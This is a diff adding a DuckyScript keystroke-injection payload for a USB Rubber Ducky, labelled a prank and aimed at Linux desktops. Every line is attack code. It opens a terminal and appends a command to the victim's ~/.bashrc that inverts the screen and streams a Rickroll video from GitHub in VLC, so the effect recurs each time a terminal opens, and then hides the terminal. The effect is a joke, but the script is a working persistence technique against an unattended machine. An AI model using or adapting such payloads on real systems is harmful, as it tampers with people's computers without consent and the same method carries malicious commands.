@@ -1,0 +1,19 @@
+REM Title: Inverted display Rickroll Tux style
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04.
+REM Props: Hak5, the community and memes
+REM Version: 1.0
+REM Category: Prank
+REM Rotates the screen 180 and loads up a 180 Rickroll. This version launches it every time they open a terminal.
+REM
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 2000
+STRING echo "xrandr -o inverted && vlc https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Inverted_desktop_troll/Rick/rick.mp4" >> ~/.bashrc
+DELAY 300
+ENTER
+DELAY 300
+ALT F4
